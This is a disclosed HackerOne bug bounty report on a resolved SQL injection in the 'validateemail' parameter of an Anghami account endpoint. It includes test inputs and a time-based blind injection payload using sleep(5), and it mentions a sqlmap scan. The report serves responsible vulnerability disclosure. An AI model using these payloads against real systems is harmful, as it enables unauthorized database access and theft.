---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '86468'
original_report_id: '86468'
title: '[https://www.anghami.com/updatemailinfo/] Sql Injection'
weakness: SQL Injection
team_handle: anghami
created_at: '2015-09-01T14:51:06.092Z'
disclosed_at: '2015-10-02T11:49:34.547Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- sql-injection
---

# [https://www.anghami.com/updatemailinfo/] Sql Injection

## Metadata

- HackerOne Report ID: 86468
- Weakness: SQL Injection
- Program: anghami
- Disclosed At: 2015-10-02T11:49:34.547Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi , 

I'd like to report a sql  injection issue, first you need to be logged in  in order to exploit this issue . 
The vulnerable parameter is **validateemail** .  

####some tests
validateemail=sdfsdf@sdfsd.com&phoneormail=  => Please Check Your email to verify
validateemail=sdfsdf@sdfsd.com'&phoneormail=  => *message dissapeared
validateemail=sdfsdf@sdfsd.com''&phoneormail=  => Please Check Your email to verify
validateemail=test@yopmail.com' or sleep(5) #&sid=0&lang=en&phoneormail= => server timeout
###POC

db version : MySQL 5.0.11

you can find a screenshot from sqlmap scan confirming the issue . 

Thanks

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
